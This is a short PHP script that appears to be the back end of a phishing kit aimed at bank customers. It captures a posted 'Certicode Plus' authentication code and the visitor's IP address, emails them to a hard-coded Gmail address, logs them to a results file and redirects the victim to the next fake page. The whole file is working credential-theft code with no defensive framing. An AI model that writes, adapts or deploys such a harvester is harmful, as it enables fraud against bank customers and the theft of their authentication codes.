<?php
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$back = "index2.html";
$hostname = gethostbyaddr($ip);
$message .= "~~~~~~ Login ~~~~~~\n";
$message .= "Certicode Plus              : ".$_POST['code']."\n";
$message .= "~~~~~~~~~ Infos ~~~~~~~~~~~\n";
$message .= "IPs              : $ip\n";
$message .= "~~~~~~~ CVV ~~~~~~~\n";
$send = "dnani4593@gmail.com";
$subject = "Certicode PST | $ip ";
$headers .= "MIME-Version: 1.0\n";
mail($send,$subject,$message,$headers);
 
$file = fopen("../rslt/sms.txt","a");
fwrite($file,$message); 

header("Location: $back");

?>
*
eric78<